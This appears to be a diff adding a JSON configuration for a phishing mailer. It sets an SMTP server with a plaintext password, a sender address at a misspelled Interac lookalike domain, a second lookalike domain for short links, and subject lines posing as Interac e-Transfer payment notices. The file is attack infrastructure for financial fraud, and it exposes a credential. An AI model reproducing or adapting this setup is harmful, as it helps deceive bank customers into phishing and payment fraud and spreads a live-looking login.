@@ -1,0 +1,13 @@
+{
+  "host": "smtp.zeptomail.ca",
+  "port": 587,
+  "username": "a@interac-recieve.cfd",
+  "pass": "ReFeQceUsNS1",
+  "shortScr": "intershort-transferwindow.cfd",
+  "mailnames": ["noreply", "glina"],
+  "subjects": [
+    "Incoming Transfer: eTransfer transaction #",
+    "test",
+    "testiclecancer"
+  ]
+}
